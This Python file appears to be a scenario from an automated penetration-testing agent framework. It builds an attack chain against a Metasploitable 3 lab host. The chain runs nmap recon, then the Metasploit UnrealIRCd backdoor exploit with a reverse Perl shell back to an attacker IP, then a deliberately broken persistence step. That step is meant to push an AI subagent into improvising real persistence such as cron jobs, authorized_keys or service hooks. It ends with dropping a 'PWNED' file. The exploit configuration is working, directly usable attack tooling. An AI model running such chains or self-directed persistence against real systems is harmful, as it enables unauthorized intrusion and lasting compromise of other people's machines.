"""
Example Attack Graph: DELIBERATELY FLAWED at the PERSISTENCE stage (Metasploitable 3)

This graph lands a real working session, then breaks ON PURPOSE at the
persistence stage, to exercise the direct->subagent FALLBACK for the
persistence stage specifically.

Chain:
  recon        — nmap full-ish scan to map services
  gain_access  — WORKING proven lander: exploit/unix/irc/unreal_ircd_3281_backdoor
                 on 6667 with cmd/unix/reverse_perl -> command shell session.
  persist      — THE FLAW. A prescribed persistence module with a WRONG/unsupported
                 datastore option so DIRECT execution fails.
  file_drop    — write+read a proof-of-compromise file via the session.

THE FLAW (persist node):
  module = exploit/linux/local/service_persistence
  module_options = {"SESSION": "1"}

  The prescribed direct module/option combo is wrong: this historically fails
  with "Unknown datastore option: SESSION" / module-load issues when executed
  directly with only SESSION set. Direct execution fails fast, which (in explore
  mode) must trigger the new direct->subagent FALLBACK for the PERSISTENCE stage:
  the persistence stage subagent should improvise a real working persistence
  mechanism (e.g. cron, SSH authorized_keys, init/service hook) over the live
  session and verify it.

EXPECTED ADAPTATION:
  gain_access succeeds and opens session 1. The persist node's prescribed direct
  command fails -> orchestrator falls back to the persistence subagent, which
  establishes a real persistence mechanism via the existing session. The chain
  then proceeds to file_drop, which writes and reads back the proof file.

Run with explore=True so the direct->subagent fallback is active.
"""

from core_agents.attack_graph import (
    AttackGraph, AttackNode, AttackEdge, EdgeCheck,
    EdgeCondition, Tactic,
)


def build_flaw_persistence_graph(target_ip: str, attacker_ip: str) -> AttackGraph:

    graph = AttackGraph.create(
        objective="Compromise the Metasploitable 3 target via the UnrealIRCd "
                  "3.2.8.1 backdoor on port 6667, establish a reliable persistence "
                  "mechanism, and drop a verified proof-of-compromise file. (This "
                  "plan is intentionally flawed at the persistence stage: the "
                  "prescribed persistence module/option is wrong and fails direct "
                  "execution — the persistence subagent must recover.)",
        target_ip=target_ip,
        name=f"flaw_persistence_{target_ip}",
        attacker_ip=attacker_ip,
        scope=[target_ip],
        description="Intentionally-flawed-at-persistence chain to test the "
                    "direct->subagent fallback for the persistence stage.",
        metadata={"scenario": "flaw_persistence", "target_type": "metasploitable3"},
    )

    # =========================================================================
    # NODES
    # =========================================================================

    graph.add_node(AttackNode(
        id="recon",
        label="Discover Attack Surface",
        tactic=Tactic.RECONNAISSANCE.value,
        technique_id="T1046",
        technique_name="Network Service Discovery",
        agent_type="recon",
        goal="Map the target's open services and versions",
        objective=f"Discover open ports, services and versions on {target_ip}.",
        target_ip=target_ip,
        tool_name="nmap",
        commands_to_run=[f"nmap -Pn -sV --top-ports 1000 -T4 {target_ip}"],
        max_retries=2,
        tags=["recon"],
    ))

    # WORKING proven lander: UnrealIRCd 3.2.8.1 backdoor on 6667.
    graph.add_node(AttackNode(
        id="gain_access",
        label="Gain Initial Access (UnrealIRCd backdoor)",
        tactic=Tactic.INITIAL_ACCESS.value,
        technique_id="T1190",
        technique_name="Exploit Public-Facing Application",
        agent_type="exploit",
        goal="Open a command shell session on the target",
        objective=f"Gain an initial command shell on {target_ip} via the "
                  f"UnrealIRCd 3.2.8.1 backdoor on port 6667. "
                  f"LHOST={attacker_ip}.",
        target_ip=target_ip,
        tool_name="metasploit",
        module="exploit/unix/irc/unreal_ircd_3281_backdoor",
        module_options={"RHOSTS": target_ip, "RPORT": 6667},
        payload="cmd/unix/reverse_perl",
        payload_options={"LHOST": attacker_ip, "LPORT": 4464},
        max_retries=3,
        tags=["initial_access", "unrealircd", "backdoor"],
    ))

    # THE FLAW: prescribed persistence module + WRONG datastore option.
    # Direct execution fails ("Unknown datastore option: SESSION" / module-load
    # issues) -> orchestrator falls back to the persistence SUBAGENT.
    graph.add_node(AttackNode(
        id="persist",
        label="Establish Persistence (WRONG module/option on purpose)",
        tactic=Tactic.PERSISTENCE.value,
        technique_id="T1543.002",
        technique_name="Create or Modify System Process: Systemd Service",
        agent_type="persistence",
        goal="Install a persistence mechanism via the session",
        objective="Establish a reliable persistence mechanism on the target via "
                  "the session and verify it is in place. (The prescribed module "
                  "is wrong; if it fails, find a persistence vector that actually "
                  "works over the existing session.)",
        target_ip=target_ip,
        tool_name="metasploit",
        module="exploit/linux/local/service_persistence",
        module_options={"SESSION": "1"},
        max_retries=2,
        tags=["persistence", "flaw_wrong_module"],
    ))

    graph.add_node(AttackNode(
        id="file_drop",
        label="Drop Proof-of-Compromise File",
        tactic=Tactic.IMPACT.value,
        technique_id="T1485",
        technique_name="Data Destruction",
        agent_type="impact",
        goal="Demonstrate compromise with a written artifact",
        objective="Write a proof-of-compromise file to "
                  "/tmp/pwned_flaw_persist.txt via the session, then read it back "
                  "to verify the write succeeded.",
        target_ip=target_ip,
        tool_name="session",
        commands_to_run=[
            "echo '{marker}' > {target_file}",
            "echo \"Compromised at $(date)\" >> {target_file}",
            "echo \"User: $(whoami)\" >> {target_file}",
            "cat {target_file}",
        ],
        command_params={
            "target_file": "/tmp/pwned_flaw_persist.txt",
            "marker": "PWNED via flaw_persistence chain",
        },
        max_retries=3,
        metadata={"target_file": "/tmp/pwned_flaw_persist.txt"},
        tags=["impact", "file_drop", "proof"],
    ))

    # =========================================================================
    # EDGES
    # =========================================================================

    graph.connect(
        "recon", "gain_access",
        checks=[EdgeCheck(field="success", operator="equals", expected="True",
                          description="Recon produced usable service data")],
        evidence="Recon mapped the attack surface",
        rationale="Attempt initial access via the UnrealIRCd backdoor",
    )
    graph.connect(
        "gain_access", "persist",
        checks=[EdgeCheck(field="session_id", operator="exists",
                          description="A session was opened")],
        evidence="Initial session established",
        rationale="Establish persistence on the session",
    )
    graph.connect(
        "persist", "file_drop",
        checks=[EdgeCheck(field="session_id", operator="exists",
                          description="Session is still usable for impact")],
        evidence="Persistence established (via subagent fallback)",
        rationale="Demonstrate impact with a proof-of-compromise file",
    )

    return graph


# =============================================================================
# CLI
# =============================================================================

if __name__ == "__main__":
    graph = build_flaw_persistence_graph(
        target_ip="192.168.34.7",
        attacker_ip="192.168.34.6",
    )
    print(graph.summary())
    print()

    out_path = "examples/flaw_persistence_graph.json"
    graph.save(out_path)
    print(f"Saved to {out_path}")

    loaded = AttackGraph.load(out_path)
    print(f"\nReloaded: {loaded}")
    print(f"Ready nodes: {loaded.ready_nodes()}")
